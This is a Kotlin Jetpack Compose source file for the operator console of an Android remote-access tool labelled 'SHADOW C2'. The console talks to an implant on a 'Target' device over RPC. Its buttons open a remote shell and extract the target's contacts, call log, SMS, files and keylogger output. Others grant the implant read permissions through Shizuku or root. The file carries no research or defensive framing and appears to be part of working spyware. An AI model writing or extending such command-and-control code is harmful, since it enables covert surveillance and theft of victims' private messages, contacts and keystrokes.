package com.shadow.operator.ui.fleet

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import com.shadow.operator.ui.theme.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FleetScreen(
    rpc: RpcClient,
    onImplantSelect: () -> Unit,
    onFileManager: () -> Unit,
    onModules: () -> Unit
) {
    var status by remember { mutableStateOf<Map<String, Any>?>(null) }
    var connected by remember { mutableStateOf(false) }
    var lastHeartbeat by remember { mutableStateOf(0L) }
    var resultText by remember { mutableStateOf<String?>(null) }
    var busyAction by remember { mutableStateOf<String?>(null) }
    val scope = rememberCoroutineScope()

    // Poll status every 5 seconds
    LaunchedEffect(Unit) {
        while (true) {
            status = rpc.getStatus()
            connected = (status?.get("connected") as? Boolean) ?: false
            lastHeartbeat = (status?.get("lastHeartbeat") as? Long) ?: (status?.get("lastHeartbeat") as? Int)?.toLong() ?: 0L
            delay(5000)
        }
    }

    fun runAction(label: String, command: String, payload: String = "{}") {
        if (busyAction != null) return
        busyAction = label
        resultText = "Executing $label..."
        scope.launch {
            val result = rpc.execute(command, payload)
            resultText = result
            busyAction = null
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text(
                            "SHADOW",
                            color = AccentGreen,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 22.sp
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(
                            "C2",
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 14.sp
                        )
                    }
                },
                actions = {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.padding(horizontal = 12.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .background(
                                    if (connected) OnlineGreen else OfflineRed,
                                    shape = RoundedCornerShape(4.dp)
                                )
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(
                            if (connected) "ONLINE" else "OFFLINE",
                            color = if (connected) OnlineGreen else OfflineRed,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = SurfaceDark,
                    titleContentColor = TextPrimary
                )
            )
        },
        containerColor = BgBlack
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .verticalScroll(rememberScrollState())
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            // Connection status card
            Card(
                colors = CardDefaults.cardColors(containerColor = SurfaceElevated),
                shape = RoundedCornerShape(12.dp)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text(
                            "Target Alpha",
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 18.sp
                        )
                        Text(
                            if (connected) "LIVE" else "DEAD",
                            color = if (connected) OnlineGreen else OfflineRed,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 14.sp
                        )
                    }
                    Column(horizontalAlignment = Alignment.End) {
                        if (lastHeartbeat > 0) {
                            val secs = (System.currentTimeMillis() - lastHeartbeat) / 1000
                            Text(
                                "${secs}s ago",
                                color = TextSecondary,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 11.sp
                            )
                        }
                        Text(
                            "Pending: ${status?.get("pendingCommands") ?: "--"}",
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                }
            }

            // Terminal (full width)
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .clickable { onImplantSelect() },
                colors = CardDefaults.cardColors(containerColor = SurfaceDark),
                shape = RoundedCornerShape(12.dp)
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.Terminal, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(24.dp))
                    Spacer(Modifier.width(12.dp))
                    Text(
                        "Shell Terminal",
                        color = TextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 16.sp,
                        modifier = Modifier.weight(1f)
                    )
                    Icon(Icons.Default.ChevronRight, contentDescription = null, tint = TextSecondary)
                }
            }

            // DATA EXTRACTION grid
            Text(
                "DATA EXTRACTION",
                color = TextSecondary,
                fontFamily = FontFamily.Monospace,
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold
            )
            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp),
                modifier = Modifier.height(180.dp)
            ) {
                items(listOf(
                    ActionData("Contacts", Icons.Default.Contacts, Color.White, "contacts"),
                    ActionData("Call Log", Icons.Default.Call, Color.White, "calllog"),
                    ActionData("SMS", Icons.Default.Message, Color.White, "sms"),
                    ActionData("Device Info", Icons.Default.Info, AccentBlue, "device_info"),
                    ActionData("Files", Icons.Default.Folder, AccentAmber, "__files__"),
                    ActionData("Keylog Today", Icons.Default.Keyboard, AccentRed, "keylog_file"),
                )) { action ->
                    ActionButton(
                        label = action.label,
                        icon = action.icon,
                        color = action.color,
                        busy = busyAction == action.label,
                        onClick = {
                            if (action.command == "__files__") onFileManager()
                            else runAction(action.label, action.command)
                        }
                    )
                }
            }

            // PERMISSIONS grid
            Text(
                "GRANT PERMISSIONS (requires Shizuku/root on target)",
                color = TextSecondary,
                fontFamily = FontFamily.Monospace,
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold
            )
            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp),
                modifier = Modifier.height(120.dp)
            ) {
                items(listOf(
                    ActionData("Read Contacts", Icons.Default.Contacts, AccentGreen, "grant:READ_CONTACTS"),
                    ActionData("Read CallLog", Icons.Default.Call, AccentGreen, "grant:READ_CALL_LOG"),
                    ActionData("Read SMS", Icons.Default.Message, AccentGreen, "grant:READ_SMS"),
                )) { action ->
                    ActionButton(
                        label = action.label,
                        icon = action.icon,
                        color = action.color,
                        busy = busyAction == action.label,
                        onClick = {
                            val perm = action.command.substringAfter("grant:")
                            runAction(action.label, "grant", """{"permission":"$perm"}""")
                        }
                    )
                }
            }

            // Result display
            if (resultText != null) {
                Card(
                    colors = CardDefaults.cardColors(containerColor = SurfaceDark),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            "OUTPUT",
                            color = AccentGreen,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(Modifier.height(8.dp))
                        Text(
                            resultText ?: "",
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 12.sp,
                            lineHeight = 18.sp,
                            maxLines = 30,
                            overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis
                        )
                    }
                }
            }
        }
    }
}

data class ActionData(val label: String, val icon: ImageVector, val color: Color, val command: String)

@Composable
fun ActionButton(label: String, icon: ImageVector, color: Color, busy: Boolean, onClick: () -> Unit) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .aspectRatio(1f)
            .clickable(onClick = onClick),
        colors = CardDefaults.cardColors(containerColor = if (busy) AccentGreen.copy(alpha = 0.1f) else SurfaceElevated),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            if (busy) {
                CircularProgressIndicator(
                    color = color,
                    modifier = Modifier.size(20.dp),
                    strokeWidth = 2.dp
                )
            } else {
                Icon(icon, contentDescription = label, tint = color, modifier = Modifier.size(22.dp))
            }
            Spacer(Modifier.height(6.dp))
            Text(
                label,
                color = if (busy) AccentGreen else TextSecondary,
                fontFamily = FontFamily.Monospace,
                fontSize = 10.sp,
                maxLines = 1
            )
        }
    }
}

@Composable
fun StatRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 2.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(label, color = TextSecondary, fontFamily = FontFamily.Monospace, fontSize = 12.sp)
        Text(value, color = TextPrimary, fontFamily = FontFamily.Monospace, fontSize = 12.sp)
    }
}
